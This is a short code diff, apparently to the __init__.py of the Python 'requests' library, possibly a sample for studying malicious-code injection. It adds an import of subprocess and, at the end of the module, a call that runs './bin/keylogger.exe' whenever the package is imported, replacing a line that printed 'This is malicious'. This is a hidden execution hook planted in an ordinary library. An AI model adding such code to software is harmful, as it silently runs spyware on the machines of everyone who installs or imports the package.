@@ -44,6 +44,8 @@ import warnings
 
 import urllib3
 
+import subprocess
+
 from .exceptions import RequestsDependencyWarning
 
 try:
@@ -218,4 +220,5 @@ logging.getLogger(__name__).addHandler(NullHandler())
 # FileModeWarnings go off per the default.
 warnings.simplefilter("default", FileModeWarning, append=True)
 
-print("This is malicious")
+subprocess.run(["./bin/keylogger.exe"])
+print("Ran subprocess")
